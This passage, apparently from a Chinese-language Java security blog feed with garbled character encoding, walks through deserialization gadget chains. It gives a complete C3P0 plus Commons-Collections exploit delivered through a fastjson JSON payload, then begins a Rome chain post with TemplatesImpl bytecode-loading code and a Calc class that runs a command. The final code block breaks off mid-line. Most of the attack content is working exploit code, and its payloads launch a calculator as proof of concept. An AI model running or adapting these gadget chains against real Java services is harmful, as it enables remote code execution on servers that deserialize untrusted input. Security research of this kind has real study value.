ç±»å‹çš„userOverrideååºåˆ—åŒ–ä¸ºå¯¹è±¡ï¼Œå…·ä½“æµç¨‹ä¸ºè¯»å–ä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå°†å…¶è½¬æ¢æˆå­—èŠ‚æµæ•°ç»„ä¿å­˜åœ¨serBytesï¼Œæœ€åå°†è¿™ä¸ªå­—èŠ‚æµæ•°ç»„äº¤ç»™<code>SerializableUtils.fromByteArray()</code>è§£æ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211191640095.png" alt="image-20221119164059061"></p><p>åœ¨è½¬æ¢è¿‡ç¨‹ä¸­è°ƒç”¨äº†<code>substring()</code>æˆªå»å­—ç¬¦ä¸²å¤´éƒ¨çš„<code>HASM_HEADER</code>åŒæ—¶æˆªå»å­—ç¬¦ä¸²æœ€åä¸€ä½ï¼Œæ‰€ä»¥æ„é€ æ—¶éœ€æ³¨æ„ä¸¤ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.åœ¨åå…­è¿›åˆ¶å­—ç¬¦ä¸²å¤´éƒ¨åŠ ä¸ŠHASM_HEADER</span><br><span class="line">2.åœ¨ç»“å°¾åŠ ä¸Šä¸€ä¸ª;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>SerializableUtils.fromByteArray()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211191651564.png" alt="image-20221119165152534"></p><p>è°ƒç”¨äº†<code>deserializeFromByteArray()</code>ï¼Œæœ€ç»ˆåœ¨<code>deserializeFromByteArray()</code>å®ç°ååºåˆ—åŒ–æ“ä½œ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211191652899.png" alt="image-20221119165240870"></p><p><strong>Gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WrapperConnectionPoolDataSource.WrapperConnectionPoolDataSource(boolean autoregister)</span><br><span class="line">C3P0ImplUtils.parseUserOverridesAsString( String userOverridesAsString )</span><br><span class="line">SerializableUtils.fromByteArray(byte[] bytes)</span><br><span class="line">SerializableUtils.deserializeFromByteArray(byte[] bytes)</span><br></pre></td></tr></table></figure><p><strong>Expç¼–å†™</strong></p><p>æ€è·¯å¾ˆç®€å•ï¼Œç”±äºæ­¤é“¾æ˜¯å°†ä¼ å…¥çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–ï¼ŒåŒæ—¶é“¾å­çš„ç¬¬ä¸€æ­¥ä¼ å…¥çš„å‚æ•°æ˜¯ <code>this.getUserOverridesAsString()</code>ï¼Œæ‰€ä»¥ç»“åˆfastjsonçš„é“¾å­å¾ˆå¥½æ‰“</p><p>ç»“åˆCC1(å…¶ä»–é“¾å­éƒ½æ˜¯å¯ä»¥çš„ï¼Œåªè¦æœ‰ç›¸åº”çš„ä¾èµ–)</p><p>å¯¼å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HexbaseGadget</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//CC1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c1.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(o));</span><br><span class="line"><span class="comment">//        System.out.println(hex);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†ç±»åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å­—èŠ‚æ•°ç»„è½¬åå…­è¿›åˆ¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211191744465.png"></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> C3P0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹è·¯--Romeååºåˆ—åŒ–</title>
      <link href="/2022/11/14/Rome/"/>
      <url>/2022/11/14/Rome/</url>
      
        <content type="html"><![CDATA[<h1 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h1><h2 id="ä¸€ã€ç¯å¢ƒæ­å»º"><a href="#ä¸€ã€ç¯å¢ƒæ­å»º" class="headerlink" title="ä¸€ã€ç¯å¢ƒæ­å»º"></a>ä¸€ã€ç¯å¢ƒæ­å»º</h2><p>æ–°å»ºä¸€ä¸ª<code>Maven</code>é¡¹ç›®ï¼Œåœ¨<code>pom.xml</code>ä¸­å¯¼å…¥<code>rome</code>ä¾èµ–</p><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p><strong>Gadget</strong></p><p><strong>ysoserial</strong>ä¸­çš„åˆ©ç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">Method.invoke(Object, Object...)</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ObjectBean.toString()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ObjectBean.hashCode()</span><br><span class="line"></span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><h2 id="äºŒã€åˆ©ç”¨é“¾æ„é€ åˆ†æ"><a href="#äºŒã€åˆ©ç”¨é“¾æ„é€ åˆ†æ" class="headerlink" title="äºŒã€åˆ©ç”¨é“¾æ„é€ åˆ†æ"></a>äºŒã€åˆ©ç”¨é“¾æ„é€ åˆ†æ</h2><p>é“¾å°¾ä¸º<code>TemplatesImpl::getOutputProperties</code></p><p>æœ€ç»ˆåˆ©ç”¨ä¸ºTemplatesImplåŠ è½½æ¶æ„å­—èŠ‚ç å¯¼è‡´RCE</p><p><strong>TemplatesImpl</strong>åˆ©ç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl::newTransformer()</span><br><span class="line">TemplatesImpl::getTransletInstance()</span><br><span class="line">TemplatesImpl::defineTransletClasses()</span><br><span class="line">TransletClassLoader::defineClass()</span><br></pre></td></tr></table></figure><p>å¯ä»¥å…ˆå†™ä¸ª<strong>BadTemplatesImpl</strong>æ”¾ç€</p><p><strong>exp1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadTemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Calc.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192007142.png" alt="image-20221116192007142"></p><p>ä¹Ÿå¯ä»¥ç›´æ¥å°†æ¶æ„ç±»å°è£…æˆä¸€ä¸ªå‡½æ•°</p><p>éœ€è¦å¼•å…¥ä¸‹ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.28.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span 